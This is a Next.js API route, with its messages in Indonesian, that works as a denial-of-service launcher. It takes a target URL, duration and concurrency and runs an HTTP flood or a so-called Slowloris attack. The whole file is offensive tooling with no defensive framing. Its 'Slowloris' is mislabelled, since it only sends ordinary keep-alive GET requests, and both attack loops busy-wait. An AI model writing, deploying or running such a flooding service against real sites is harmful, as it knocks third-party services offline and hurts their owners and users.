import { NextResponse } from "next/server";
import axios from "axios";

export async function POST(req) {
    try {
        const { targetUrl, method, duration, concurrent } = await req.json();
        const attackDuration = parseInt(duration) * 1000; 
        const endTime = Date.now() + attackDuration;

        if (!targetUrl || !method || !duration || !concurrent) {
            return NextResponse.json({ message: "Input tidak valid!" }, { status: 400 });
        }

        switch (method) {
            case "http":
                runHttpFlood(targetUrl, concurrent, endTime);
                break;
            case "slowloris":
                runSlowlorisAttack(targetUrl, concurrent, endTime);
                break;
            default:
                return NextResponse.json({ message: "Metode tidak valid!" }, { status: 400 });
        }

        return NextResponse.json({ message: "Serangan dimulai!" });

    } catch (error) {
        return NextResponse.json({ message: "Terjadi kesalahan!" }, { status: 500 });
    }
}

// HTTP Flood Attack
function runHttpFlood(url, concurrent, endTime) {
    while (Date.now() < endTime) {
        for (let i = 0; i < concurrent; i++) {
            axios.get(url).catch(() => {});
        }
    }
}

// Slowloris Attack
function runSlowlorisAttack(url, concurrent, endTime) {
    while (Date.now() < endTime) {
        for (let i = 0; i < concurrent; i++) {
            axios({
                method: "GET",
                url: url,
                headers: { "Connection": "keep-alive" },
                timeout: 10000
            }).catch(() => {});
        }
    }
}
